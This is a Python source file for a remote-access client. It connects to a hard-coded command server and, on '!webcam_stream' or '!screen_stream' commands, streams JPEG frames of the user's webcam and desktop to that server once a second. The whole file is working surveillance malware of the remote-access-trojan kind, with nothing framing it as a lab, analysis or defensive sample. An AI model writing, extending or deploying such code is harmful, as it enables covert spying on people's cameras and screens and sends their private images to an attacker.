import socket
import cv2
import pyautogui
import threading
import requests
import os
import time
from PIL import ImageGrab
from io import BytesIO

# Connect to the server
SERVER_IP = "10.0.1.33"
SERVER_PORT = 9999
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def send_screenshot():
    while True:
        screenshot = ImageGrab.grab()
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format="JPEG")
        img_data = img_byte_arr.getvalue()
        client_socket.sendall(img_data)
        time.sleep(1)

def send_webcam():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            img_data = img_encoded.tobytes()
            client_socket.sendall(img_data)
        time.sleep(1)

def receive_commands():
    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break
        print(f"Received Command: {command}")
        if command == "!webcam_stream":
            threading.Thread(target=send_webcam).start()
        elif command == "!screen_stream":
            threading.Thread(target=send_screenshot).start()

def start_client():
    client_socket.connect((SERVER_IP, SERVER_PORT))
    threading.Thread(target=receive_commands).start()

if __name__ == "__main__":
    start_client()
